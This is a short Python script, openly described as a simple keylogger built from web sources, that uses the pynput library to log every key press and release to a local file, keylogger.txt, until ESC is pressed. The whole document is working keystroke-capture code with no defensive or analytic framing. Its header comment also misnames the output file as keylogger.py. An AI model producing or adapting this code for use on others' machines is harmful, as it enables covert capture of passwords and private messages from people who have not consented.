#Simple keylogger program built using various sources around the web
#Outputs keystrokes to file called keylogger.py 
#Press ESC to quit
from pynput import keyboard
f = open("keylogger.txt", "a")
def on_press(key):
    try:
        f.write('{0} '.format(
            key.char))
    except AttributeError:
        f.write('{0} '.format(
            key))

def on_release(key):
    f.write('{0} '.format(
        key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()